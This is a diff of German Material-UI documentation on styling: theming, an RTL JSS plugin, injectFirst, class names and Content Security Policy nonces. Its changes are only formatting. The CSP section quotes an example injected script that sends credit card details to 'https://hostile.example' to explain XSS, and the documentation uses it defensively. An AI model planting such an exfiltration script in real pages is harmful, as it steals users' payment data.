@@ -4,7 +4,7 @@
 
 ## Theming
 
-Fügen Sie auf der oberste Ebene Ihrer App einen ` ThemeProvider` hinzu, um auf das Theme im Komponentenbaum von React zuzugreifen. Anschließend können Sie in den Stilfunktionen auf das Designobjekt zugreifen.
+Fügen Sie auf der oberste Ebene Ihrer App einen `ThemeProvider` hinzu, um auf das Theme im Komponentenbaum von React zuzugreifen. Anschließend können Sie in den Stilfunktionen auf das Designobjekt zugreifen.
 
 ```jsx
 import { ThemeProvider } from '@material-ui/styles';
@@ -98,18 +98,14 @@ Es ist eine Teilmenge von [ Jss-Preset-Default ](https://cssinjs.org/jss-preset-
 ```jsx
 import { create } from 'jss';
 import { StylesProvider, jssPreset } from '@material-ui/styles';
-import rtl from 'jss-rtl'
+import rtl from 'jss-rtl';
 
 const jss = create({
   plugins: [...jssPreset().plugins, rtl()],
 });
 
 function App() {
-  return (
-    <StylesProvider jss={jss}>
-      ...
-    </StylesProvider>
-  );
+  return <StylesProvider jss={jss}>...</StylesProvider>;
 }
 
 export default App;
@@ -141,15 +137,13 @@ Standardmäßig werden die Stile **zuletzt** in das `<head>` -Element Ihrer Seit
 
 ### injectFirst
 
-Die ` StylesProvider ` Komponente hat eine `injectFirst` Eigenschaft, um die Styles **zuerst** zu injizieren:
+Die `StylesProvider` Komponente hat eine `injectFirst` Eigenschaft, um die Styles **zuerst** zu injizieren:
 
 ```js
 import { StylesProvider } from '@material-ui/styles';
 
-<StylesProvider injectFirst>
-  {/* Dein Komponentenbaum.
-      Mit Stil versehene Komponenten können die Stile von Material-UI überschreiben. */}
-</StylesProvider>
+<StylesProvider injectFirst>{/* Dein Komponentenbaum.
+      Mit Stil versehene Komponenten können die Stile von Material-UI überschreiben. */}</StylesProvider>;
 ```
 
 ### insertionPoint
@@ -285,13 +279,16 @@ Siehe [unsere Beispiel](https://github.com/mui-org/material-ui/blob/next/example
 Möglicherweise haben Sie festgestellt, dass die Klassennamen, die von unserer Styling-Lösung generiert werden, **nicht deterministisch sind**. Sie können sich also nicht darauf verlassen, dass sie gleich bleiben. Die Klassennamen werden von [unserem Klassennamengenerator generiert](/css-in-js/api/#creategenerateclassname-options-class-name-generator). Nehmen wir den folgenden Stil als Beispiel:
 
 ```jsx
-const useStyles = makeStyles({
-  root: {
-    opacity: 1,
+const useStyles = makeStyles(
+  {
+    root: {
+      opacity: 1,
+    },
   },
-}, {
-  name: 'AppBar',
-});
+  {
+    name: 'AppBar',
+  },
+);
 ```
 
 Es wird ein `AppBar-root-123` Klassenname generiert. Das folgende CSS wird nicht funktionieren:
@@ -346,7 +343,7 @@ Wir bieten eine Option, um die Klassennamen **deterministisch zu machen** mit de
 - entwicklung: `.AppBar-root`
 - produktion: `.AppBar-root`
 
-⚠️ **Seien Sie vorsichtig, wenn Sie `dangerouslyUseGlobalCSS `** verwenden. Das Verlassen auf diesen Code, der in der Produktion ausgeführt wird, hat folgende Auswirkungen:
+⚠️ **Seien Sie vorsichtig, wenn Sie `dangerouslyUseGlobalCSS`** verwenden. Das Verlassen auf diesen Code, der in der Produktion ausgeführt wird, hat folgende Auswirkungen:
 
 - Es ist schwieriger, die `Klassen` API-Änderungen zwischen Hauptversionen zu verfolgen.
 - Globales CSS ist von Natur aus fragil.
@@ -377,7 +374,6 @@ Grundsätzlich verringert CSP Cross-Site Scripting (XSS)-Angriffe, indem Entwick
     <script>
       sendCreditCardDetails('https://hostile.example');
     </script>
-    
 
 Diese Sicherheitsanfälligkeit ermöglicht es dem Angreifer, irgendetwas auszuführen. Mit einem sicheren CSP-Header lädt der Browser dieses Skript jedoch nicht.
 
@@ -398,18 +394,13 @@ const nonce = new Buffer(uuidv4()).toString('base64');
 Es ist sehr wichtig, dass Sie die UUID Version 4 verwenden, da es einen **unvorhersehbaren** String generiert. Sie wenden dann dieses Nonce auf den CSP-Header an. Ein CSP-Header könnte mit der angewendeten Nonce so aussehen:
 
 ```js
-header('Content-Security-Policy')
-  .set(`default-src 'self'; style-src: 'self' 'nonce-${nonce}';`);
+header('Content-Security-Policy').set(`default-src 'self'; style-src: 'self' 'nonce-${nonce}';`);
 ```
 
 Wenn Sie Server Side-Rendering (SSR) verwenden, sollten Sie die Nonce im `<style>`-Tag des Servers übergeben.
 
 ```jsx
-<style
-  id="jss-server-side"
-  nonce={nonce}
-  dangerouslySetInnerHTML={{ __html: sheets.toString() } }
-/>
+<style id="jss-server-side" nonce={nonce} dangerouslySetInnerHTML={{ __html: sheets.toString() }} />
 ```
 
 Dann müssen Sie dieses Nonce an JSS übergeben, damit es den nachfolgenden `<style>`-Tags hinzugefügt werden kann. Die Clientseite erhält die Nonce aus einem Header. Sie müssen diesen Header unabhängig davon angeben, ob SSR verwendet wird oder nicht.
